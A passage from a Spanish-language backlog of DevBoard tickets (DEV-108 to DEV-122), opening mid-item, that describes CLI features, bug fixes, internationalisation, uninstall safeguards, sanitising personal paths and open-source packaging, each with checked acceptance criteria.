Implementar un sistema de notificación de versiones disponibles similar a Supabase CLI o Homebrew, que verifique en segundo plano si existe un release más nuevo en GitHub, cachee el resultado por 24 horas y notifique al desarrollador en consola y en la interfaz visual sin retrasar el tiempo de respuesta.

**Criterios de Aceptación:**
- [x] #1 Verificación no bloqueante en background al ejecutar bin/devboard.js y bin/devboard-mcp.js consultando la versión más reciente en GitHub Releases.
- [x] #2 Almacenamiento en caché local de la última verificación (TTL: 24 horas) en ~/.devboard/update-cache.json para no demorar el inicio del CLI ni saturar la API.
- [x] #3 Mostrar un banner informativo y amigable en terminal cuando exista una versión más reciente con instrucciones claras de actualización.
- [x] #4 Exponer endpoint o flag de actualización para mostrar un badge sutil en el Header de la UI cuando haya una versión nueva.
- [x] #5 Permitir silenciar la verificación mediante variable de entorno (DEVBOARD_NO_UPDATE_CHECK=1).

---

#### [DEV-108] Resolución Absoluta de Rutas en Tailwind y Bundler para Ejecución Global del CLI
- **Prioridad**: `urgent` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.6.0

Corregir la resolución de rutas en tailwind.config.js y la carga de configuración de Vite en bin/devboard.js para usar rutas absolutas ancladas a PKG_ROOT. Esto evita que al ejecutar el CLI desde repositorios externos, Tailwind busque clases en la carpeta del repositorio host en lugar del paquete DevBoard, lo que provocaba el colapso visual de la cabecera y la desestilización del layout.

**Criterios de Aceptación:**
- [x] #1 Resolver rutas absolutas para content en tailwind.config.js usando fileURLToPath y path.join(__dirname, ...), garantizando que escanee los componentes de DevBoard independientemente de process.cwd().
- [x] #2 Configurar explícitamente configFile: path.resolve(PKG_ROOT, 'vite.config.ts') en createServer dentro de bin/devboard.js para evitar colisiones con bundlers o configuraciones del repositorio host.
- [x] #3 Verificar que al ejecutar devboard desde cualquier carpeta externa en el sistema operativo, la UI compile y renderice todas las clases utilitarias de Tailwind con fidelidad completa (sin colapso de cabecera ni inputs planos).
- [x] #4 Validar que el modo dark aplique correctamente en inputs, columnas y contenedores al ejecutar en directorios remotos.

---

#### [DEV-109] Asistente Interactivo de Inicialización y Scaffolding Personalizable (devboard --init)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.6.0

Implementar un asistente interactivo y personalizable en 'devboard --init' (con soporte interactivo mediante readline nativo y flags no interactivas --yes / --defaults). El asistente permite al usuario elegir: (1) Modo de operación: Single Project (autocontenido y aislado) o Multi-Project (registrado en el Hub global ~/.devboard/registry.json), (2) Inclusión de la skill de agente (.agents/skills/devboard/SKILL.md), (3) Inclusión de reglas de gobernanza AGENTS.md, (4) Inclusión de scripts en package.json ('board', 'mcp'), (5) Reglas preventivas en .gitignore. Todo el proceso debe ser idempotente, no destructivo y permitir re-ejecución para modificar preferencias en el mismo dispositivo.

**Criterios de Aceptación:**
- [x] #1 Asistente interactivo en 'devboard --init' con preguntas claras (modo single vs hub, skills, AGENTS.md, package.json scripts, .gitignore) y flag no interactiva '--yes' / '-y'.
- [x] #2 Soporte de selección de modo: en single project mode no registra en el Hub y configura .devboard/config.json con 'mode: single'; en multi project mode registra en ~/.devboard/registry.json.
- [x] #3 Scaffolding opcional y limpio de '.agents/skills/devboard/SKILL.md' con la documentación canónica de herramientas MCP y mejores prácticas de agente.
- [x] #4 Scaffolding opcional de 'AGENTS.md' con reglas de gobernanza adaptadas para el proyecto anfitrión.
- [x] #5 Configuración opcional de scripts en package.json ('board': 'devboard', 'mcp': 'devboard-mcp') e inclusión defensiva de reglas en .gitignore sin duplicados.
- [x] #6 Idempotencia y no destructividad: si el proyecto ya fue inicializado, permite cambiar opciones sin alterar ni borrar tareas existentes en backlog/tasks/.

---

#### [DEV-110] Actualización de Documentación del CLI y Especificación Canónica del Modelo de Datos
- **Prioridad**: `medium` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: 0.6.0

Actualización integral de la documentación del proyecto DevBoard para reflejar las capacidades de empaquetado, scaffolding interactivo y ejecución del CLI introducidas durante el Sprint 6, junto con la especificación canónica del modelo de datos de tareas en la arquitectura.

**Criterios de Aceptación:**
- [x] #1 Actualizar README.md con las nuevas capacidades del CLI de Sprint 6 (devboard --init interactivo y flag -y, modos --single y --hub, parámetro --port, y verificador de actualizaciones) manteniendo la versión en desarrollo en el sprint
- [x] #2 Documentar en docs/ARCHITECTURE.md el Modelo de Datos Canónico completo (YAML frontmatter, secciones Markdown delimitadas y mapeo con TypeScript y UI)
- [x] #3 Documentar en docs/ARCHITECTURE.md los nuevos módulos de persistencia y configuración (initScaffold.js, registryConfig.js, updateChecker.js y estándar XDG)
- [x] #4 Validar que npm run backlog:check y npm test pasen con código 0

---

#### [DEV-111] Soporte Interactivo de Visualización y Edición de Labels y Assignees en ItemModal
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.6.0

Completitud de UX en el modal de ítem (ItemModal): permitir la visualización y edición interactiva de etiquetas (labels) y personas/agentes asignados (assignees), cerrando la brecha entre el modelo de persistencia Markdown y la interfaz gráfica.

**Criterios de Aceptación:**
- [x] #1 Permitir visualizar y editar etiquetas (labels) en ItemModal mediante input de tags y chips eliminables con click
- [x] #2 Permitir visualizar y editar asignados (assignees) en ItemModal mediante chips con botón de remover
- [x] #3 Transmitir labels y assignees en el payload de onSave hacia la API de backend sin perder datos en disco
- [x] #4 Validar que los ítems con labels y assignees se persistan correctamente en backlog/tasks/*.md y se reflejen en la UI

---

#### [DEV-112] Resiliencia en Script Prepare de Package.json para npx e Instalación Directa
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.6.1

Al intentar ejecutar o instalar DevBoard directamente desde GitHub según la guía de inicio rápido (Profile 1: `npx github:pablojavierrodriguez/dev-board --init` o `npm install -g github:pablojavierrodriguez/dev-board`), la ejecución aborta inmediatamente con Exit Code 128.

Causa raíz:
En package.json el script de ciclo de vida `"prepare": "git config core.hooksPath .githooks"` se ejecuta automáticamente cuando npm extrae el paquete desde un repositorio Git en una carpeta temporal de cache. Al no existir un árbol de trabajo .git válido en ese entorno temporal, git config arroja error fatal (exit code 128: fatal: not in a git directory) y npm aborta la instalación por completo.

Solución:
Hacer condicional y resiliente el script prepare para que valide la existencia de un worktree git antes de invocar git config o ignore de forma segura el fallo si no se encuentra en la raíz de un repo git:
`git rev-parse --is-inside-work-tree >/dev/null 2>&1 && git config core.hooksPath .githooks 2>/dev/null || true`

**Criterios de Aceptación:**
- [x] #1 El script prepare en package.json valida la presencia de un worktree Git antes de ejecutar git config o implementa fallback seguro con `|| true` para no romper entornos temporales de npm.
- [x] #2 Probar que la ejecución de `npx github:pablojavierrodriguez/dev-board --help` o `--init` funciona sin arrojar Exit Code 128.
- [x] #3 Probar que la instalación global `npm install -g github:pablojavierrodriguez/dev-board` completa exitosamente sin abortos de ciclo de vida.

---

#### [DEV-113] Resiliencia en Scripts Generados por Scaffolding y Banner de Onboarding
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.6.1

Cuando un usuario inicializa un repositorio con `npx github:pablojavierrodriguez/dev-board --init`, el asistente genera scripts `"board": "devboard"` y `"mcp": "devboard-mcp"` en el `package.json` consumidor y finaliza sugiriendo `(o npx devboard)`.

Dado que el paquete se distribuye directamente vía GitHub y aún no está publicado en el registro público de npm (npmjs.com) bajo el nombre `devboard`:
1. `npx devboard` aborta con `npm error could not determine executable to run`.
2. Si el usuario no ejecutó previamente la instalación global `npm install -g github:pablojavierrodriguez/dev-board`, ejecutar `npm run board` en el repo consumidor falla con `sh: devboard: command not found`.
3. Al invocar `devboard` o `npx github:...`, Node.js falla con `Cannot find package 'vite'` porque `vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss`, `autoprefixer` y `typescript` estaban clasificados como `devDependencies` en `package.json`, y npm los omite al instalar paquetes vía npx o de forma global para consumidores.

Solución:
1. En `scripts/initScaffold.js`, generar scripts resilientes en el `package.json` consumidor que intenten invocar el binario global/local y, si no existe en PATH, hagan fallback transparente a npx sobre el repo de GitHub:
   `"board": "devboard 2>/dev/null || npx -y github:pablojavierrodriguez/dev-board"`
   `"mcp": "devboard-mcp 2>/dev/null || npx -y -p github:pablojavierrodriguez/dev-board devboard-mcp"`
2. Promover `vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss`, `autoprefixer` y `typescript` a `dependencies` en `package.json` de dev-board para que se instalen siempre en el cache de npx o globalmente.
3. Actualizar el banner final de éxito en `scripts/initScaffold.js` para indicar con precisión los comandos funcionales.
4. Actualizar la Agent Skill embebida (`getSkillTemplate`) en `scripts/initScaffold.js` y `.agents/skills/devboard/SKILL.md` para reflejar la configuración MCP canónica con fallback y con binario global.
5. Resolver el problema de pantalla en blanco al ejecutar en repositorios externos: registrar PostCSS y Tailwind CSS con resolución absoluta explícita en `vite.config.ts` y `postcss.config.js` para evitar fallos de pre-transformación de estilos (`Cannot read properties of undefined (reading 'get')`).
6. Añadir `RootErrorBoundary` e inline fallback en `src/main.tsx` e `index.html` para erradicar pantallas en blanco ante excepciones de renderizado.
7. Unificar y homogeneizar todo el flujo de onboarding (asistente CLI, banner, skills y `README.md`) al español coherente, eliminando fragmentos e inconsistencias en inglés.
8. Corregir importación en `src/main.tsx`: sustituir la importación de default inválida `import ReactDOM from 'react-dom/client'` por la importación canónica con nombre `import { createRoot } from 'react-dom/client'` y configurar `optimizeDeps.include` y `resolve.dedupe` en `vite.config.ts`.

**Criterios de Aceptación:**
- [x] #1 `initScaffold.js` genera scripts "board" y "mcp" en el `package.json` consumidor con fallback automático a `npx -y github:pablojavierrodriguez/dev-board` si `devboard` no está instalado globalmente.
- [x] #2 El banner final de `devboard --init` muestra los comandos exactos de ejecución sin asumir publicación en npmjs.org e instruye la instalación global opcional (`npm install -g ...`).
- [x] #3 La plantilla de Agent Skill (`getSkillTemplate`) en `initScaffold.js` y `.agents/skills/devboard/SKILL.md` documenta la configuración MCP compatible con ejecución directa y vía GitHub.
- [x] #4 Validar mediante suite de integración (`npm test`, `npm run backlog:check`) que el asistente genera la nueva configuración resiliente y los tests pasan al 100%.
- [x] #5 Promover paquetes de servidor Vite (`vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss`, `autoprefixer`, `typescript`) a `dependencies` en `package.json` para que npx e instalación global no fallen por dependencias faltantes.
- [x] #6 Configurar PostCSS y Tailwind con rutas absolutas explícitas en `vite.config.ts` y `postcss.config.js`, erradicando el fallo de pre-transformación de estilos y pantalla en blanco al iniciar el servidor desde repositorios externos.
- [x] #7 Unificar el asistente de onboarding, banners y plantillas de skills en español coherente y profesional, y desacoplar la documentación oficial con `README.md` (inglés para la comunidad internacional) y `README.es.md` (español nativo) con selector bilingüe.
- [x] #8 Implementar `RootErrorBoundary` en `src/main.tsx` y fallback inline en `index.html` garantizando tolerancia ante fallos y cero pantallas en blanco.
- [x] #9 Corregir importación canónica de `createRoot` desde `react-dom/client` (`import { createRoot } from 'react-dom/client'`) y configurar `optimizeDeps.include` y `resolve.dedupe` en `vite.config.ts`, erradicando el fallo de sintaxis por falta de export default en ESM.

---

#### [DEV-114] Internacionalización Integral (i18n): Selector de Idioma en CLI (--init), Diccionarios Cockpit UI y Templates Bilingües
- **Prioridad**: `high` | **Tipo**: `feature`

Implementar soporte formal y arquitectónico de internacionalización (i18n) en todo el ecosistema de DevBoard:

1. **Selector de Idioma en Onboarding CLI (`devboard --init`):**
   - Preguntar al usuario en el paso 1 si desea configurar su repositorio en Español (es) o Inglés (en).
   - Generar la configuración de idioma en `.devboard/config.json` o `package.json` (`"language": "es" | "en"`).
   - Desplegar las plantillas de gobernanza (`AGENTS.md`) y Agent Skills (`.agents/skills/devboard/SKILL.md`) en el idioma seleccionado por el usuario.

2. **Capa de Internacionalización en Cockpit UI (Frontend):**
   - Diseñar sistema liviano y sin dependencias pesadas de i18n (o usando un micro-store tipado en TypeScript con diccionarios `src/locales/en.json` y `src/locales/es.json`).
   - Selector visual de idioma (🌐 EN / ES) en la barra superior o configuración del cockpit.
   - Persistencia de la preferencia en `localStorage` con detección automática inicial del idioma del navegador (`navigator.language`).
   - Tipado estricto de claves de traducción para evitar cadenas hardcodeadas o claves faltantes en tiempo de compilación (`t('header.sprint')`, `t('modal.confirm')`, etc.).

3. **Templates Bilingües y Documentación:**
   - Mantener simetría estricta entre la documentación en inglés (`README.md`) y español (`README.es.md`).
   - Soportar generación de Backlog y Releases en el idioma configurado para el proyecto.

**Criterios de Aceptación:**
- [x] #1 Asistente `devboard --init` solicita la selección de idioma (`[1] Español (es) / [2] English (en)`) y persiste la elección en la configuración local del proyecto.
- [x] #2 `scripts/initScaffold.js` genera los templates de `AGENTS.md` y `.agents/skills/devboard/SKILL.md` en el idioma seleccionado (ES o EN).
- [x] #3 Diseñar arquitectura de diccionarios tipados `src/locales/{en,es}.json` y hook `useTranslation()` / `t(key)`.
- [x] #4 Implementar selector de idioma en la barra de navegación del Cockpit con persistencia en `localStorage` y detección de `navigator.language`.
- [x] #5 Migrar las vistas principales (`KanbanBoard`, `SprintView`, `ItemModal`, `BacklogTable`, `ConfirmModal`) al sistema de traducción, erradicando textos hardcodeados.
- [x] #6 Validar tipado TypeScript estricto de las claves de traducción (`npx tsc --noEmit` sin errores) y suite de tests unitarios/integración.

---

#### [DEV-115] Comando CLI de Desinstalación y Eject Seguro Inteligente (devboard --uninstall)
- **Prioridad**: `medium` | **Tipo**: `feature`

Implementar un comando `devboard --uninstall` (o `devboard --clean` / `--eject`) inteligente y con discriminación contextual de alcance, permitiendo al usuario decidir con precisión quirúrgica si desea desacoplar DevBoard exclusivamente del repositorio actual o erradicarlo por completo de todas sus instancias locales en el dispositivo.

**Capacidades y Flujo Inteligente del Comando:**

1. **Detección Contextual del Entorno:**
   - Analiza la configuración local en `.devboard/config.json` (modo `single` o `multi`).
   - Inspecciona el registro central global en `~/.devboard/registry.json` para determinar si existen otros repositorios registrados en la máquina.

2. **Selector Interactivo de Alcance (Scope):**
   Si se detectan múltiples instancias o registros globales, el asistente presenta un menú claro:
   - **[1] Desacoplar sólo este proyecto (Recomendado):**
     - Si es Mono-Proyecto (`single`), limpia únicamente la carpeta local `.devboard/` y los scripts `"board"` / `"mcp"` en `package.json`. No toca ningún archivo global ni afecta a otros repositorios.
     - Si pertenecía al Hub global (`multi`), desvincula únicamente la entrada de este repositorio en `~/.devboard/registry.json`, dejando intactos los demás proyectos.
   - **[2] Erradicación completa del dispositivo (Global Purge):**
     - Desacopla el repositorio actual.
     - Limpia o elimina el directorio central de registro `~/.devboard/`.
     - Ofrece opcionalmente desvincular los scripts inyectados en los demás repositorios que estaban registrados en el Hub.
     - Instruye la desinstalación del binario global si estuviese instalado (`npm uninstall -g dev-board`).

3. **Pregunta Opcional por Artefactos de Agente:**
   - Pregunta si desea remover la Agent Skill (`.agents/skills/devboard/SKILL.md`) y la guía `AGENTS.md` o si prefiere conservarlas para colaborar con agentes de IA.

4. **Garantía Inviolable de Cero Pérdida de Información:**
   - En **cualquiera** de las opciones elegidas, el directorio `backlog/` (`backlog/tasks/`, `releases.json`, `BACKLOG.md`) **permanece 100% intacto y legible**.

5. **Modo No Interactivo / CI:**
   - Soporte de flags `--yes` / `-y` (desacopla el proyecto actual por defecto) y `--global` / `--all` (para purga total desatendida).

**Criterios de Aceptación:**
- [x] #1 Soporte para flags `devboard --uninstall` y `devboard --clean` en `bin/devboard.js`, con el handler ejecutándose **antes** del registro de proyecto para no re-registrar el repo que se está desacoplando
- [x] #2 Detección automática del modo local (`single` vs `multi`) e inspección de `~/.devboard/registry.json` para saber si hay otras instalaciones en el sistema
- [x] #3 Menú interactivo con selección de alcance: `[1] Desacoplar sólo este proyecto` vs `[2] Erradicar de todas las instancias locales`
- [x] #4 Reversión segura de scripts `"board"` y `"mcp"` en `package.json`: sólo se revierten los valores que DevBoard inyectó, y un script propio del usuario llamado `board` se preserva
- [x] #5 En purga global, desregistro de repositorios en `~/.devboard/registry.json` y limpieza de registros huérfanos, con advertencia y confirmación explícita del número de proyectos afectados
- [x] #6 Preservación estricta del directorio `backlog/` y del archivo `BACKLOG.md` en todos los repositorios involucrados, garantizada por construcción
- [x] #7 Soporte de flags `--yes` / `-y` y `--global` / `--all` para automatización sin intervención humana
- [x] #8 Tests de integración automatizados en `scripts/verify-integration.js` que validan el aislamiento mono-proyecto y la preservación del backlog y de los scripts propios
- [x] #9 Guarda de integridad contra path traversal: `removeIfExists` sólo borra rutas contenidas en el repo, además de rechazar las protegidas
- [x] #10 La reversión del `.gitignore` quita también el comentario de encabezado que DevBoard agregó, para no dejar `# DevBoard local cache` huérfano
- [x] #11 Flag `--remove-agents` para eliminar `.agents/skills/devboard` y `AGENTS.md`, que por defecto se preservan
- [x] #12 Módulo tipado: `scripts/uninstall.d.ts` declara las firmas sin `any`
- [x] #13 El comando se documenta en `README.md` y `README.es.md` con su tabla de flags y las garantías
- [x] #14 Regresión: el nombre de la opción coincide entre el CLI (`removeAgentArtifacts`) y la función; el test falla si vuelve a desalinearse
- [x] #15 `npx tsc --noEmit` finishes con código 0
- [x] #16 `npm test` finishes con código 0
- [x] #17 `npm run build` finishes con código 0
- [x] #18 `npm run backlog:check` finishes con código 0

---

#### [DEV-116] Detección Multi-Stack de Puertos Libres y Aislamiento de Origen en Single-Project Mode
- **Prioridad**: `high` | **Tipo**: `bug`

Corregir la colisión de puertos ("sockets fantasma") y secuestro de tráfico HTTP cuando coexisten múltiples instancias de DevBoard en modo Single-Project (ej. `instancia-b` en `[::1]:4100` y `dev-board` en `*:4100`).

**Problema Identificado:**
1. En macOS Darwin, un proceso que enlaza `host: 'localhost'` (`[::1]:4100`) y otro que enlaza `host: true` (`*:4100`) coexisten en el kernel sin arrojar `EADDRINUSE`.
2. Vite con `strictPort: false` no detecta que el puerto 4100 está tomado y no salta a 4101.
3. El navegador resuelve `localhost` por IPv6 y entrega todo el tráfico a la otra instancia (`instancia-b`).
4. Al compartir origen (`localhost:4100`), `localStorage` (`devboard_active_project_id`) contamina el proyecto activo y sobreescribe `~/.devboard/registry.json`.

**Solución Técnica:**
- Detección proactiva multi-stack (IPv4 `127.0.0.1` + IPv6 `::1`) para hallar el primer puerto libre (4100, 4101, 4102...).
- Unificar `host: 'localhost'` por defecto en `vite.config.ts` y `bin/devboard.js`.
- Blindar `src/App.tsx` en `singleProject: true` para ignorar `localStorage` residual de otros proyectos y no disparar `setActiveProjectApi` prematuramente.

**Criterios de Aceptación:**
- [x] #1 AC1: Implementar función de detección multi-stack `isPortAvailable(port)` que verifique conexión y bind en `127.0.0.1` y `::1`.
- [x] #2 AC2: Resolver automáticamente el puerto disponible (4100 -> 4101 -> ...) en `vite.config.ts` y `bin/devboard.js` ante puertos ocupados.
- [x] #3 AC3: Reemplazar `host: true` por `host: 'localhost'` (respetando `--host` o `DEVBOARD_HOST`) en `vite.config.ts`.
- [x] #4 AC4: Bloquear `selectedProjectId` en `src/App.tsx` cuando `boardData.singleProject` es `true`, previniendo sobreescritura de `activeProjectId` en `registry.json`.
- [x] #5 AC5: Eliminar el proceso duplicado/colgado actual de `dev-board` (PID 51522).
- [x] #6 AC6: Verificar tipado estricto (`npx tsc --noEmit`), suite de pruebas (`npm test`) y sincronización de backlog (`npm run backlog:check`).

---

#### [DEV-117] Resolución Canónica de Identidad de Proyecto y Ciclo de Vida de Sprints Temáticos
- **Prioridad**: `high` | **Tipo**: `bug`

Resolver la confusión estructural entre el nombre del directorio en el sistema de archivos (`path.basename`, ej: `"my-repo"`) y el nombre real del proyecto o aplicación (definido en `package.json` o `.devboard/config.json`, ej: `"MyApp"`), así como la invisibilidad de botones de ciclo de vida (Iniciar/Completar Sprint) y del selector "Ver completados" en sprints temáticos no numerados.

**Causas Raíz Identificadas:**
1. **Confusión de Identidad Directorio vs Producto:** `bin/devboard.js`, `initScaffold.js` y `vite.config.ts` asumían ciegamente `path.basename(targetRepo)` como nombre e ID del proyecto. Si un repositorio `MyApp` se clonó en una carpeta `my-repo`, DevBoard registraba el proyecto como `my-repo`, generando una discrepancia de IDs entre el proyecto activo y las tareas/sprints del backlog.
2. **Ciclo de Vida Roto para Sprints Temáticos:** La auto-inicialización de sprints en `vite.config.ts` intentaba extraer un número (`parseInt(name.replace(/\D/g, ''), 10)`). En sprints temáticos (ej. *"Integridad Financiera"*, *"Performance y Escala"*), esto arrojaba `0`, provocando que todos se marcaran simultáneamente como `active`.
3. **Omisión de Botones en SprintView:** Si un sprint no estaba explícitamente dado de alta en `sprints.json`, `SprintView.tsx` no generaba `sprintObj`, ocultando completamente las insignias de estado y los botones de acción (`Completar Sprint`, `Ver Retrospectiva`). Además, el contador `completedSprintsCount` no detectaba grupos con 100% de tareas completadas, ocultando el botón "Ver completados".
4. **Filtro Estricto de ProjectId en Single-Project:** En `App.tsx`, las listas `allProjectItems`, `projectSprints` y `projectReleases` filtraban rígidamente por `projectId === selectedProjectId`, descartando elementos si había disparidad entre el ID de carpeta y el ID del paquete.

**Criterios de Aceptación:**
- [x] #1 Implementar `resolveProjectIdentity(repoPath)` con cascada canónica: 1) `.devboard/config.json`, 2) `package.json` (`productName`, `displayName`, `name`), 3) `path.basename(repoPath)`.
- [x] #2 Integrar `resolveProjectIdentity` en `bin/devboard.js`, `scripts/initScaffold.js`, `getRegistry()`, `readProjectBacklog()` y resolución de `activeProject` en `vite.config.ts`.
- [x] #3 En `initScaffold.js`, permitir al usuario confirmar o personalizar el nombre del proyecto en el asistente interactivo y persistirlo en `.devboard/config.json`.
- [x] #4 En `vite.config.ts`, eliminar la deducción numérica regex de sprints y auto-reconciliar el estado a `'completed'` cuando el 100% de las tareas estén en `done`, `ready` o `finish`.
- [x] #5 En `SprintView.tsx`, calcular `completedSprintsCount` considerando tanto `sprints.json` como grupos de tareas 100% completadas, y proveer fallback dinámico para `sprintObj` asegurando renderizado de insignias y botones de ciclo de vida.
- [x] #6 En `App.tsx`, asegurar que en `singleProject` (o `projects.length <= 1`), las colecciones `allProjectItems`, `projectSprints` y `projectReleases` no descarten elementos por discrepancias de `projectId`.
- [x] #7 Validar tipado TypeScript estricto (`npx tsc --noEmit`), suite de pruebas (`npm test`) y chequeo de integridad (`npm run backlog:check`).

---

#### [DEV-118] Erradicación de Rutas Absolutas Personales y Referencias a Proyectos Privados
- **Prioridad**: `urgent` | **Tipo**: `bug`

Eliminar todas las rutas absolutas hardcodeadas (`/Users/<usuario>/<ruta-personal>`), referencias a proyectos privados y directorios locales de todos los archivos rastreados por Git. Garantizar que ningún dato personal o de proyectos privados se filtre al hacer público el repositorio.

Archivos afectados:
- `scripts/migrate-to-target-repo.js` - eliminar (script personal)
- `scripts/import-docs.js` - eliminar (script de migración personal)
- `vite.config.ts` L113 - ruta hardcodeada `/Users/<usuario>/<ruta-personal>`
- `data/projects-registry.json` - destrackear de Git (ya en .gitignore)
- `.agents/rules/codebase-navigation.md` - links `file:///Users/<usuario>/<ruta-personal>` → rutas relativas

**Criterios de Aceptación:**
- [x] #1 Eliminar `scripts/migrate-to-target-repo.js` del repositorio (script de uso personal, no del producto) - verificado que nada lo importa
- [x] #3 Limpiar `vite.config.ts`: se eliminó el bloque `if (project.id === 'dom')` con la ruta absoluta hardcodeada. La función `getProjectDocsPath` vuelve a devolver `null` cuando no encuentra docs
- [x] #4 `data/projects-registry.json` destrackear de Git - **ya cumplido de facto**: el archivo está en `.gitignore` (línea 30) y nunca fue trackeado. `git ls-files --error-unmatch` lo confirma. No había nada que ejecutar
- [x] #5 Reescribir los links `file:///` a rutas relativas
- [x] #6 Verificar con grep sobre archivos rastreados que no queda ninguna ruta absoluta personal (verificación ejecutada con el patrón completo, y el propio criterio redactado para que la comprobación sea satisfacible)
- [x] #7 Verificar que `npx tsc --noEmit` y `npm test` pasan correctamente post-limpieza
- [x] #8 **AMPLIACIÓN**: sanitizar `scripts/import-docs.js` en vez de eliminarlo (3 puntos). El módulo fue renombrado después en DEV-135, al dejar de ser un script personal y pasar a ser superficie del producto
- [x] #9 **AMPLIACIÓN**: limpiar los 47 links `file:///` de `docs/ARCHITECTURE.md` y `docs/AGENTIC_PLAYBOOK.md`, ausentes del alcance original
- [x] #10 **AMPLIACIÓN**: redactar con placeholders las rutas personales citadas en las descripciones de DEV-118 y DEV-119, para que el AC #6 sea alcanzable sin destruir el sentido de las tareas
- [x] #11 `npm run build` sigue funcionando tras la eliminación del script y el cambio en `vite.config.ts`
- [x] #12 `npm run audit:ux` sigue con 0 errores y 0 advertencias

---

#### [DEV-120] Sanitización del Backlog: Anonimización de Referencias a Proyectos Externos Privados
- **Prioridad**: `high` | **Tipo**: `chore`

Revisar y anonimizar las tareas del backlog que contienen referencias explícitas al proyecto privado `DOM`, al directorio `m3` o a `c3admin`. Preservar el valor técnico de la documentación de cada tarea sin exponer información de proyectos ajenos a DevBoard.

Tareas afectadas: DEV-116, DEV-117, dev-012, dev-022, dev-024, dev-027

**Criterios de Aceptación:**
- [x] #1 Sanitizar DEV-116: reemplazar referencias a `m3` por `instancia-b` o `another-project` en el contexto de colisión de puertos
- [x] #2 Sanitizar DEV-117: reemplazar referencias a `m3` y `DOM` por ejemplos genéricos (`my-app`, `ProjectName`)
- [x] #3 Sanitizar dev-012: generalizar la referencia a `dom` y `m3/docs` como `external-project`
- [x] #4 Sanitizar dev-022: reemplazar `DOM-P, DOM-BUG, DOM-FEAT, DOM-SPEC` por `APP-P, APP-BUG, APP-FEAT, APP-SPEC`
- [x] #5 Sanitizar dev-024: reemplazar `proyecto DOM` por `proyecto externo`
- [x] #6 Sanitizar dev-027: reemplazar `m3 y c3admin` en el título por `repositorios externos`
- [x] #7 Verificar con grep que cero tareas del backlog contienen referencias privadas a DOM, m3 o c3admin (excepto en contexto técnico web estándar como DOM API)

---

#### [DEV-121] Metadatos Completos de package.json y Reorganización de Dependencias
- **Prioridad**: `high` | **Tipo**: `chore`

Completar los metadatos del `package.json` según mejores prácticas de npm y OSS, mover dependencias de build-time a `devDependencies`, agregar campo `engines` con versión mínima de Node, y agregar `files` para controlar qué se incluye en `npm pack`.

Actualmente el package.json tiene `"private": true` (bloquea npm publish) y le faltan todos los metadatos estándar.

**Criterios de Aceptación:**
- [x] #1 Remover `"private": true` del package.json
- [x] #2 Agregar campos: `description`, `repository` (type+url), `homepage`, `bugs`, `keywords` (≥10 keywords), `author`, `license: "MIT"` (configurado apuntando a https://github.com/pablojavierrodriguez/dev-board)
- [x] #3 Mover `typescript`, `vite`, `@vitejs/plugin-react`, `tailwindcss`, `postcss`, `autoprefixer` de `dependencies` a `devDependencies`
- [x] #4 Agregar `"engines": { "node": ">=22.6.0" }` requerido por `--experimental-strip-types`
- [x] #5 Agregar `"files": ["bin", "dist", "data/demo-backlog.json", "LICENSE", "README.md", "README.es.md"]` para controlar el contenido de npm pack
- [x] #6 Verificar que `npm pack --dry-run` lista solo los archivos esperados (sin `src/`, `scripts/`, `backlog/`)
- [x] #7 Verificar que `npm install` y `npm run build` siguen funcionando correctamente
- [x] #8 `lucide-react` también se mueve a `devDependencies`: es build-time igual que el resto, y los binarios publicados sólo importan built-ins de Node
- [x] #9 `dependencies` queda vacío: el paquete publicado no requiere ninguna dependencia en runtime (verificado: `bin/devboard.js` y `bin/devboard-mcp.js` sólo importan `node:*`)
- [x] #10 `author` se escribe como "DevBoard Contributors", en línea con el copyright del `LICENSE` y sin nombre propio
- [x] #11 `npx tsc --noEmit` finishes con código 0
- [x] #12 `npm test` finishes con código 0
- [x] #13 `npm run backlog:check` finishes con código 0

---

#### [DEV-122] Archivos Comunitarios Estándar: CONTRIBUTING, CODE_OF_CONDUCT, SECURITY y CHANGELOG
- **Prioridad**: `high` | **Tipo**: `docs`

Crear los archivos comunitarios estándar que todo proyecto open-source de calidad profesional debe incluir. Seguir las convenciones de la industria adaptadas al flujo de trabajo único de DevBoard (dogfooding, MCP, pair programming con IA).

**Criterios de Aceptación:**
- [x] #1 Crear `CONTRIBUTING.md` con: requisitos de entorno (Node ≥22.6), pasos de setup (clone→npm install→npm run dev), guía de branching, cómo correr tests, cómo usar DevBoard para trackear contribuciones, y sección AI contributors con MCP tools
- [x] #2 Crear `CODE_OF_CONDUCT.md` basado en Contributor Covenant v2.1 completo
- [x] #3 Crear `SECURITY.md` con política de disclosure responsable: scope de vulnerabilidades, cómo reportar, expectativas de respuesta y contact
- [x] #4 Crear `CHANGELOG.md` en formato Keep a Changelog (keepachangelog.com) con todas las versiones v0.2.0 a v0.6.1 generado a partir de releases.json
- [x] #5 Agregar links a CONTRIBUTING.md y CODE_OF_CONDUCT.md desde README.md y README.es.md en una nueva sección `## 🤝 Contributing`
- [x] #6 Verificar que todos los archivos tienen formato Markdown válido y links internos correctos
- [x] #7 El CHANGELOG se genera con `npm run changelog` (script declarado `scripts/generate-changelog.cjs`) y es idempotente: no puede desviarse de `releases.json` por edición manual
- [x] #8 El generador normaliza los `markdownContent` que traen la secuencia literal `\n` en lugar de saltos de línea reales, sin lo cual 3 de las 6 releases se renderizaban como un único párrafo
- [x] #9 El encabezado `## [x.y.z] - fecha` usa el formato que el servidor MCP ya sabe releer de `CHANGELOG.md` como fuente alternativa (`scripts/mcp-server.ts`, fallback de notas de release), de modo que el archivo nuevo no rompe ese fallback
- [x] #10 `SECURITY.md` usa el canal privado de reporte de vulnerabilidades del repositorio en lugar de un correo personal, y no incluye URLs personales (coherente con el AC #2 parcial de DEV-121, que espera la identidad canónica del repo)
- [x] #11 `npx tsc --noEmit` finishes con código 0
- [x] #12 `npm test` finishes con código 0
- [x] #13 `npm run backlog:check` finishes con código 0
